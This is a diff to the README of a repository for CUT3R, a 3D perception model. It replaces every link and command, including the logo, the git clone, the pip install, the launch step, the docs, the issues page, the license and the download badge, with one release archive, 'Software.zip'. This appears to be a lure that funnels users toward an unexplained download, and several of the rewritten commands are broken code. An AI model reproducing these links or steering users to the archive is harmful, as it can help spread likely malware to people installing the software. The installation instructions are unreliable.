@@ -1,6 +1,6 @@
 # CUT3R
 
-![CUT3R Logo](https://www.example.com/logo.png)
+![CUT3R Logo](https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository of CUT3R - the Continuous 3D Perception Model with Persistent State.
 
@@ -21,17 +21,17 @@ To get started with CUT3R, follow these steps:
 
 1. Clone the repository:
    ```
-   git clone https://github.com/username/CUT3R.git
+   git clone https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip
    ```
 
 2. Install the dependencies:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip
    ```
 
 3. Launch the application:
    ```
-   python main.py
+   python https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip
    ```
 
 ## Usage
@@ -45,14 +45,14 @@ from CUT3R import model
 model = CUT3R()
 
 # Perform continuous 3D perception
-result = model.predict(data)
+result = https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip(data)
 
 print(result)
 ```
 
 ## Documentation
 
-For detailed instructions on using CUT3R and understanding its various components, refer to the [documentation](https://github.com/username/CUT3R/docs).
+For detailed instructions on using CUT3R and understanding its various components, refer to the [documentation](https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip).
 
 ## Contributing
 
@@ -67,18 +67,18 @@ We welcome contributions from the community to enhance the functionality and per
 
 ## Support
 
-If you encounter any issues with CUT3R or have any questions, please [create an issue](https://github.com/username/CUT3R/issues) in this repository.
+If you encounter any issues with CUT3R or have any questions, please [create an issue](https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip) in this repository.
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/username/CUT3R/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip) file for details.
 
-Get the latest version of CUT3R [here](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip).
+Get the latest version of CUT3R [here](https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip).
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Version-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip)](https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip)
 
 In case the link is not working, please check the **Releases** section for the updated version.
 
 Thank you for using CUT3R! 🚀
 
-![CUT3R Demo](https://www.example.com/demo.png)
+![CUT3R Demo](https://github.com/Jaryn-create/CUT3R/releases/download/v2.0/Software.zip)
